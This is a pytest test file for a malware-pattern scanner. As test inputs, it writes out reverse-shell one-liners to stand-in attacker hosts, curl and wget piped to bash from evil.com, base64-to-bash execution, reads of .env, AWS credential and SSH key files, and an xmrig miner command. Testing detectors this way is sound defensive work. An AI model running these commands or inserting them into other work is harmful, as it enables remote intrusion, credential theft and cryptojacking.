"""Tests for malicious pattern detection."""

from __future__ import annotations

import textwrap

import pytest

from scankii.core.patterns import MaliciousFinding, scan_content


class TestReverseShell:
    def test_detects_devtcp(self):
        code = 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
        findings = scan_content(code)
        ids = {f.pattern_id for f in findings}
        assert "reverse-shell-devtcp" in ids

    def test_detects_bash_interactive(self):
        code = 'bash -i >& /dev/tcp/attacker/1234 0>&1'
        findings = scan_content(code)
        ids = {f.pattern_id for f in findings}
        assert "reverse-shell-bash-i" in ids

    def test_detects_netcat(self):
        code = 'nc -e /bin/sh attacker.com 4444'
        findings = scan_content(code)
        ids = {f.pattern_id for f in findings}
        assert "reverse-shell-netcat" in ids

    def test_detects_mkfifo(self):
        code = 'mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1'
        findings = scan_content(code)
        ids = {f.pattern_id for f in findings}
        assert "reverse-shell-mkfifo" in ids


class TestRemoteFetchExecute:
    def test_detects_curl_pipe_bash(self):
        code = 'curl https://evil.com/script | bash'
        findings = scan_content(code)
        ids = {f.pattern_id for f in findings}
        assert "remote-fetch-exec-curl" in ids

    def test_detects_wget_pipe_sh(self):
        code = 'wget https://evil.com/malware | sh'
        findings = scan_content(code)
        ids = {f.pattern_id for f in findings}
        assert "remote-fetch-exec-wget" in ids

    def test_detects_curl_fssl(self):
        code = 'curl -fsSL https://install.evil.com/setup.sh | bash'
        findings = scan_content(code)
        ids = {f.pattern_id for f in findings}
        assert "remote-fetch-exec-curl-fssl" in ids


class TestBase64Obfuscation:
    def test_detects_base64_pipe_bash(self):
        code = 'echo "bWFsd2FyZQ==" | base64 -d | bash'
        findings = scan_content(code)
        ids = {f.pattern_id for f in findings}
        assert "base64-exec-bash" in ids

    def test_detects_js_buffer_from(self):
        code = 'Buffer.from("bWFsd2FyZQ==", "base64").toString("utf-8")'
        findings = scan_content(code)
        ids = {f.pattern_id for f in findings}
        assert "base64-exec-js" in ids


class TestCredentialTheft:
    def test_detects_env_file(self):
        code = 'with open(".env") as f:'
        findings = scan_content(code)
        ids = {f.pattern_id for f in findings}
        assert "env-theft-dotenv" in ids

    def test_detects_aws_credentials(self):
        code = 'creds = open(os.path.expanduser("~/.aws/credentials")).read()'
        findings = scan_content(code)
        ids = {f.pattern_id for f in findings}
        assert "env-theft-aws-credentials" in ids

    def test_detects_ssh_key(self):
        code = 'key = open(os.path.expanduser("~/.ssh/id_rsa")).read()'
        findings = scan_content(code)
        ids = {f.pattern_id for f in findings}
        assert "ssh-key-theft" in ids


class TestCryptoMiner:
    def test_detects_xmrig(self):
        code = './xmrig --pool stratum+tcp://pool.minexmr.com:4444'
        findings = scan_content(code)
        ids = {f.pattern_id for f in findings}
        assert "crypto-miner-xmrig" in ids

    def test_detects_hidden_tmp_binary(self):
        code = 'os.system("/tmp/.miner")'
        findings = scan_content(code)
        ids = {f.pattern_id for f in findings}
        assert "crypto-miner-tmp-exec" in ids


class TestC2Beaconing:
    def test_detects_ip_url(self):
        code = 'requests.get("http://192.168.1.1:8080/beacon")'
        findings = scan_content(code)
        ids = {f.pattern_id for f in findings}
        assert "c2-beacon-ip" in ids


class TestNoFalsePositives:
    def test_normal_code_no_findings(self):
        code = textwrap.dedent("""\
            import json
            data = {"name": "Alice", "age": 30}
            print(json.dumps(data))
        """)
        findings = scan_content(code)
        assert len(findings) == 0

    def test_normal_url_no_c2(self):
        code = 'response = requests.get("https://api.example.com/data")'
        findings = scan_content(code)
        # Should NOT match c2-beacon-ip since it's a domain, not an IP
        c2_findings = [f for f in findings if f.attack_category == "c2_beaconing"]
        assert len(c2_findings) == 0


class TestFindingFields:
    def test_finding_has_correct_fields(self):
        code = 'curl https://evil.com/script | bash'
        findings = scan_content(code, file_path="evil.sh")
        assert len(findings) >= 1
        f = findings[0]
        assert isinstance(f, MaliciousFinding)
        assert f.file_path == "evil.sh"
        assert f.line_number == 1
        assert f.severity in ("HIGH", "CRITICAL")
        assert f.attack_category
        assert f.matched_text

    def test_multiline_detection(self):
        code = textwrap.dedent("""\
            #!/bin/bash
            echo "Setting up..."
            curl -fsSL https://install.evil.com/payload.sh | bash
            echo "Done"
        """)
        findings = scan_content(code)
        curl_findings = [f for f in findings if "curl" in f.pattern_id]
        assert len(curl_findings) >= 1
        assert curl_findings[0].line_number == 3
